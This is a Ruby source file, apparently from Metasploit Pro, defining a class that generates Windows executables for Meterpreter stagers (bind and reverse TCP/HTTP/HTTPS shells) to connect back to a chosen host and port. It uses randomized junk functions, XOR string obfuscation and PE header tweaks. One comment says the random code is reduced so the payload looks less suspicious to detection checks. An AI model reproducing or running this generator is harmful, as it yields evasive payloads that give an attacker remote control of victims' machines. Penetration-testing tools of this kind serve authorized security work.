require 'rex/payloads/meterpreter/uri_checksum'

module Pro
  module DynamicStagers
    class EXEGenerator
      include Pro::DynamicStagers::Sanitizer
      include Rex::Payloads::Meterpreter::UriChecksum

      SUPPORTED_ARCHS = %w{ x86 x64 }.freeze
      SUPPORTED_STAGERS = %w{ bind_tcp reverse_tcp reverse_http reverse_https }.freeze

      DEFINITIONS_FILE_PATH = File.expand_path(File.join(File.dirname(__FILE__), 'includes', 'defines.c.template')).freeze
      TEMPLATES_PATH = File.expand_path(File.join(File.dirname(__FILE__), 'templates')).freeze


      attr_reader :arch
      attr_reader :cpu
      attr_reader :global_scope
      attr_reader :host
      attr_reader :port
      attr_reader :service
      attr_reader :ssl
      attr_reader :stager
      attr_reader :template
      attr_reader :uri
      attr_reader :xor_key

      attr_accessor :source_code

      # @params [Hash] opts An options hash
      # @option opts [String] :host The address or hostname to use for the connection
      # @option opts [String] :port The TCP port to use for the the connection (LPORT/RPORT)
      # @option opts [String] :stager The stager type to generate
      # @option opts [Symbol] :arch The processor architecture to compile under
      # @option opts [Boolean] :service Whether or not this is a service executable
      def initialize(opts={})
        opts = sanitize_options_hash(opts)

        @arch     = opts.fetch(:arch, :x86)
        @host     = opts.fetch(:host)
        @port     = opts.fetch(:port)
        @service  = opts.fetch(:service, false)
        @stager   = opts.fetch(:stager)
        @uri      = generate_random_uri
        @ssl      = @stager.include? 'https'
        @xor_key  = generate_xor_key

        @global_scope = Pro::DynamicStagers::Code::Scope.new

        if @arch.to_s == ARCH_X64
          @cpu = Metasm::X86_64.new
        else
          @cpu = Metasm::Ia32.new
        end

        raise ArgumentError, "Arch must be one of #{SUPPORTED_ARCHS.join(',')}" unless SUPPORTED_ARCHS.include? @arch.to_s
        raise ArgumentError, "Stager must be one of #{SUPPORTED_STAGERS.join(',')}" unless SUPPORTED_STAGERS.include? @stager

        @stager = @stager.gsub(/https/, 'http')
        @template = grab_template
        generate_source_code!
      end


      # @return [Metasm::PE] A Metasm PE object
      def compile
        install_global_coff_patch

        #File.write('/tmp/source.c', source_code)

        pe  = metasm_pe_patched.compile_c(cpu, source_code)
        rsrc = { 24 => { 1 => {1033 => manifest_file }}}
        pe.resource = Metasm::COFF::ResourceDirectory.from_hash rsrc
        # pe.define_singleton_method(:encode_append_section) do |s|
        #   @sections << s
        # end

        pe
      end


      # @return [String] A string of the source code for the EXE
      def generate_source_code!
        template_substitutions = default_substitutions
        added_functions = randomized_functions

        # Get all of our function definitions into a string to
        # replace the placeholder in our template with
        function_definitions = added_functions.map { |function| function.definition }
        template_substitutions[:DEFINITIONS] = function_definitions.join

        # Too much of these random code makes the payload look even more suspicious
        # for AI checks. So let's tone it down as much as possible.

        # Generate 15 sets of random variables and add them to our subsitution hash
        # This gives us plenty to work with for any template.
=begin
        (1..1).each do |x|
          variable_definitions = random_vars.map {|var| var.declarator }
          template_substitutions["VARS#{x}".to_sym] = variable_definitions.join("\n")
        end
=end

        # Create 15 sets of function calls
        # Each set can have 0-4 function calls in it, to randomize our execution flow
=begin
        (1..1).each do |x|
          function_calls = rand(5).times.map { added_functions.sample.invocation + ";" }
          template_substitutions["FUNCTIONS#{x}".to_sym] = function_calls.join("\n")
        end
=end

        @source_code = template % template_substitutions
      end


      # @return [Array<Pro::DynamicStagers::Code::Function>] An array of Function objects
      def randomized_functions
        functions = []
        iterations = rand(2..3)
        iterations.times do |x|
          random_function = Pro::DynamicStagers::Code::Function.new(scope: global_scope, random: true)
          global_scope[random_function.name] = random_function
          functions << random_function
        end
        pruned_functions(functions)
      end

      # @return [String] a VisualStudio compatible version of the source code
      def vs_source
        visual_studio_source = <<-EOS
        #include "stdafx.h"
        #include <windows.h>
        #include <stdlib.h>
        #include <stdio.h>

        EOS
        visual_studio_source << source_code.split('//VSDEFS')[1]
      end

      private

      def random_vars
        rand(5).times.map do
          var = Pro::DynamicStagers::Code::Var.new(scope: global_scope, random: true)
          global_scope[var.name] = var
          var
        end
      end


      # @param functions [Array<Pro::DynamicStagers::Code::Function>] An array of function objects to prune'
      # @return [Array<Pro::DynamicStagers::Code::Function>] A copy of the passed array with any unused functions cut out
      def pruned_functions(functions = [])
        definitions = []
        functions.each do |function|
          definitions << function.definition
        end
        definition_string = definitions.join
        functions.delete_if do |function|
          !(definition_string.include? function.invocation)
        end
      end

      # @return [String] The XOR key to use for string obfuscation
      def generate_xor_key
        sprintf("0x%02x",rand(1..255))
      end


      # @return [Hash] The default hash value
      def default_substitutions
        { HOST: host, PORT: port, URI: uri, SSL: ssl.to_s.upcase, XOR_KEY: xor_key}
      end


      # @return [String] The template for the selected stager
      def grab_template
        type_definitions = File.read(DEFINITIONS_FILE_PATH)
        if service
          basename = "#{stager}_svc.c.template"
        else
          basename = "#{stager}.c.template"
        end
        template = File.read(File.join(TEMPLATES_PATH, basename ))
        type_definitions + template
      end


      # @return [String] A randomized URI string that the reverse_http handler will read as :init_native
      def generate_random_uri
        arch_name = ARCH_X86
        if arch.to_s == "x64"
          arch_name = ARCH_X64
        end
        uuid = Msf::Payload::UUID.new(platform: 'windows', arch: arch_name)
        generate_uri_uuid(URI_CHECKSUM_INITN, uuid)
      end

      # @return [String] An XML string representing a manifest file for the EXE
      def manifest_file
        <<-EOS
          <?xml version='1.0' encoding='UTF-8' standalone='yes'?>
          <assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
            <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
              <security>
                <requestedPrivileges>
                  <requestedExecutionLevel level='asInvoker' uiAccess='false' />
                </requestedPrivileges>
              </security>
            </trustInfo>
          </assembly>
        EOS
      end

      # Applies a global patch to Metasm::COFF at runtime to fix a bug in how
      # the COFF checksum is calculated
      def install_global_coff_patch
        return if Metasm::COFF.respond_to?(:unpatched_checksum)

        Metasm::COFF.class_eval do
          class << self
            alias_method :unpatched_checksum, :checksum

            def checksum(str, endianness = :little)
              unpatched_checksum(str, endianness) + 24
            end
          end
        end
      end

      # @return [Class] subclass of Metasm::PE that overrides encode_default_mz_header
      def metasm_pe_patched

        # Dynamically extend and redefine the :pe_klass
        # Defined in: pro/msf3/lib/metasm/metasm/exe_format/pe.rb:43
        # The only line changed is "This progam cannot be run in DOS mode.\r\n"
        Class.new(Metasm::PE) do

          def encode_default_mz_header
            # XXX use single-quoted source, to avoid ruby interpretation of \r\n
            @mz.cpu = Metasm::Ia32.new(386, 16)
            @mz.assemble <<-'EOMZSTUB'
              db "This program cannot be run in DOS mode.\r\n$"
            .entrypoint
              push cs
              pop  ds
              xor  dx, dx	  ; ds:dx = addr of $-terminated string
              mov  ah, 9        ; output string
              int  21h
              mov  ax, 4c01h    ; exit with code in al
              int  21h
            EOMZSTUB

            mzparts = @mz.pre_encode

            # put stuff before 0x3c
            @mz.encoded << mzparts.shift
            raise 'OH NOES !!1!!!1!' if @mz.encoded.virtsize > 0x3c	# MZ header is too long, cannot happen
            until mzparts.empty?
              break if mzparts.first.virtsize + @mz.encoded.virtsize > 0x3c
              @mz.encoded << mzparts.shift
            end

            # set PE signature pointer
            @mz.encoded.align 0x3c
            @mz.encoded << encode_word('pesigptr')

            # put last parts of the MZ program
            until mzparts.empty?
              @mz.encoded << mzparts.shift
            end

            # ensure the sig will be 8bytes-aligned
            @mz.encoded.align 8

            @mz.encoded.fixup 'pesigptr' => @mz.encoded.virtsize
            @mz.encoded.fixup @mz.encoded.binding
            @mz.encoded.fill
            @mz.encode_fix_checksum

          end

        end

      end

    end
  end
end
